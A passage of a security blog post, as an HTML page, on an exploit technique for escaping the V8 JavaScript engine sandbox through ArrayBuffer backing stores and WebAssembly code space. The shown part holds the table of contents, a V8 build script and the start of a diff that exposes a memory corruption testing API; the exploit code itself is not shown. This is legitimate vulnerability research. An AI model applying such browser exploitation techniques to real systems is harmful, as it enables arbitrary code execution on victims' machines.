<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="In this post, I will explain an exploit technique that allows us to escape the V8 sandbox via the backing store of ArrayBuffer and WebAssembly code space. This leads us to arbitrary code execution sta">
<meta property="og:type" content="article">
<meta property="og:title" content="Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)">
<meta property="og:url" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/index.html">
<meta property="og:site_name" content="Aaron&#39;s Note">
<meta property="og:description" content="In this post, I will explain an exploit technique that allows us to escape the V8 sandbox via the backing store of ArrayBuffer and WebAssembly code space. This leads us to arbitrary code execution sta">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/1.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/2.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/3.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/4.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/5.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/6.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/7.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/8.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/9.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/10.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/11.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/12.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/13.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/14.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/15.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/16.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/17.png">
<meta property="og:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/pwn.png">
<meta property="article:published_time" content="2023-04-29T03:00:00.000Z">
<meta property="article:modified_time" content="2025-10-25T16:24:04.432Z">
<meta property="article:author" content="Seongjoon Cho">
<meta property="article:tag" content="chromium">
<meta property="article:tag" content="v8">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-TXRLJ2S4LP"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-TXRLJ2S4LP');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/04/30/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-2/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&text=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&title=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&is_video=false&description=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)&body=Check out this article: https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&title=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&title=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&title=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&title=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&name=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&t=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Setup"><span class="toc-number">1.</span> <span class="toc-text">Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Backing-store-of-ArrayBuffer"><span class="toc-number">2.1.</span> <span class="toc-text">Backing store of ArrayBuffer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Execution-flow-of-WebAssembly-function"><span class="toc-number">2.2.</span> <span class="toc-text">Execution flow of WebAssembly function</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-address-of-WebAssembly-code-space"><span class="toc-number">3.1.</span> <span class="toc-text">Get address of WebAssembly code space</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Write-shellcode-to-WebAssembly-code-space"><span class="toc-number">3.2.</span> <span class="toc-text">Write shellcode to WebAssembly code space</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Execute-shellcode"><span class="toc-number">3.3.</span> <span class="toc-text">Execute shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch"><span class="toc-number">4.</span> <span class="toc-text">Patch</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Seongjoon Cho</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-04-29T03:00:00.000Z" class="dt-published" itemprop="datePublished">2023-04-29</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/N-day/">N-day</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/chromium/" rel="tag">chromium</a>, <a class="p-category" href="/tags/v8/" rel="tag">v8</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>In this post, I will explain an exploit technique that allows us to escape the V8 sandbox via the backing store of <code>ArrayBuffer</code> and WebAssembly code space. This leads us to arbitrary code execution starting from sandboxed exploit primitives.</p>
<h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul>
<li>Ubuntu 22.04</li>
<li><a target="_blank" rel="noopener" href="https://github.com/v8/v8/commit/0ac7e1203fcb957851887fb140dc8a41139846a5"><code>0ac7e1203fcb957851887fb140dc8a41139846a5</code></a> (Feb 15, 2022)</li>
</ul>
<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># install depot_tools</span></span><br><span class="line">depot_tools_path=<span class="string">&quot;<span class="variable">$HOME</span>/depot_tools&quot;</span> <span class="comment"># absolute path</span></span><br><span class="line"><span class="keyword">if</span> [ ! -e <span class="variable">$depot_tools_path</span> ]; <span class="keyword">then</span>  <span class="comment"># depot_tools doesn&#x27;t exist</span></span><br><span class="line">  git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git <span class="variable">$depot_tools_path</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">export PATH=<span class="variable">$depot_tools_path</span>:\$PATH</span></span><br><span class="line"><span class="string">export DEPOT_TOOLS_UPDATE=0&quot;</span> &gt;&gt;~/.zshrc</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">pushd</span> <span class="variable">$depot_tools_path</span></span><br><span class="line">git checkout 4e4a2b865b6f1dfdda767dd04b210cb0e43fb4c6 <span class="comment"># https://github.com/v8/v8/blob/0ac7e1203fcb957851887fb140dc8a41139846a5/DEPS#L220</span></span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># get v8 and submodules</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;solutions = [</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    &quot;name&quot;: &quot;v8&quot;,</span></span><br><span class="line"><span class="string">    &quot;url&quot;: &quot;https://chromium.googlesource.com/v8/v8.git@0ac7e1203fcb957851887fb140dc8a41139846a5&quot;,</span></span><br><span class="line"><span class="string">    &quot;managed&quot;: True,</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">]&#x27;</span> &gt;.gclient</span><br><span class="line">gclient <span class="built_in">sync</span> -Dvvv</span><br><span class="line"></span><br><span class="line"><span class="comment"># build v8</span></span><br><span class="line"><span class="built_in">pushd</span> v8</span><br><span class="line">git apply ../sandbox.diff</span><br><span class="line"><span class="built_in">sudo</span> apt install -y apache2-bin binutils binutils-aarch64-linux-gnu binutils-arm-linux-gnueabihf binutils-mips64el-linux-gnuabi64 binutils-mipsel-linux-gnu bison bzip2 cdbs curl dbus-x11 devscripts dpkg-dev elfutils fakeroot flex git-core gperf lib32gcc-s1 lib32stdc++6 libasound2 libasound2-dev libatk1.0-0 libatspi2.0-0 libatspi2.0-dev libbluetooth-dev libbrlapi0.8 libbrlapi-dev libbz2-1.0 libbz2-dev libc6 libc6-dev libc6-i386 libcairo2 libcairo2-dev libcap2 libcap-dev libcups2 libcups2-dev libcurl4-gnutls-dev libdrm2 libdrm-dev libelf-dev libevdev2 libevdev-dev libexpat1 libffi7 libffi-dev libfontconfig1 libfreetype6 libgbm1 libgbm-dev libglib2.0-0 libglib2.0-dev libglu1-mesa-dev libgtk-3-0 libgtk-3-dev libinput10 libinput-dev libjpeg-dev libkrb5-dev libnspr4 libnspr4-dev libnss3 libnss3-dev libpam0g libpam0g-dev libpango-1.0-0 libpci3 libpci-dev libpcre3 libpixman-1-0 libpng16-16 libpulse0 libpulse-dev libsctp-dev libspeechd2 libspeechd-dev libsqlite3-0 libsqlite3-dev libssl-dev libstdc++6 libudev1 libudev-dev libuuid1 libva-dev libvulkan1 libvulkan-dev libwayland-egl1-mesa libwww-perl libx11-6 libx11-xcb1 libxau6 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxdmcp6 libxext6 libxfixes3 libxi6 libxinerama1 libxkbcommon-dev libxrandr2 libxrender1 libxshmfence-dev libxslt1-dev libxss-dev libxt-dev libxtst6 libxtst-dev locales mesa-common-dev openbox p7zip patch perl pkg-config python-setuptools rpm ruby snapcraft subversion uuid-dev wdiff x11-utils xcompmgr xz-utils zip zlib1g <span class="comment"># manually install build dependencies</span></span><br><span class="line">gn gen out/debug --args=<span class="string">&#x27;v8_enable_sandbox=true v8_expose_memory_corruption_api=true is_component_build=false v8_optimized_debug=false&#x27;</span></span><br><span class="line">gn gen out/release --args=<span class="string">&#x27;v8_enable_sandbox=true v8_expose_memory_corruption_api=true is_debug=false v8_enable_object_print=true v8_symbol_level=2&#x27;</span></span><br><span class="line">autoninja -C out/debug d8</span><br><span class="line">autoninja -C out/release d8</span><br><span class="line"><span class="built_in">popd</span></span><br></pre></td></tr></table></figure>

<p><code>sandbox.diff</code> below is identical to <a target="_blank" rel="noopener" href="https://github.com/v8/v8/commit/4a12cb1022ba335ce087dcfe31b261355524b3bf">this commit</a>, which allows us to use the memory corruption API to implement sandboxed exploit primitives.</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/BUILD.bazel b/BUILD.bazel</span></span><br><span class="line"><span class="comment">index 8d1184f0925..c58bf397ef8 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.bazel</span></span><br><span class="line"><span class="comment">+++ b/BUILD.bazel</span></span><br><span class="line"><span class="meta">@@ -1926,6 +1926,8 @@</span> filegroup(</span><br><span class="line">         &quot;src/sandbox/external-pointer-table.cc&quot;,</span><br><span class="line">         &quot;src/sandbox/external-pointer-table-inl.h&quot;,</span><br><span class="line">         &quot;src/sandbox/external-pointer-table.h&quot;,</span><br><span class="line"><span class="addition">+        &quot;src/sandbox/testing.cc&quot;,</span></span><br><span class="line"><span class="addition">+        &quot;src/sandbox/testing.h&quot;,</span></span><br><span class="line">         &quot;src/sandbox/sandbox.cc&quot;,</span><br><span class="line">         &quot;src/sandbox/sandbox.h&quot;,</span><br><span class="line">         &quot;src/sandbox/sandboxed-pointer-inl.h&quot;,</span><br><span class="line"><span class="comment">diff --git a/BUILD.gn b/BUILD.gn</span></span><br><span class="line"><span class="comment">index 6adac93038c..23137954f3f 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.gn</span></span><br><span class="line"><span class="comment">+++ b/BUILD.gn</span></span><br><span class="line"><span class="meta">@@ -311,6 +311,11 @@</span> declare_args() &#123;</span><br><span class="line">   # Enable all available sandbox features. Implies v8_enable_sandbox.</span><br><span class="line">   v8_enable_sandbox_future = false</span><br><span class="line"> </span><br><span class="line"><span class="addition">+  # Expose the memory corruption API to JavaScript. Useful for testing the sandbox.</span></span><br><span 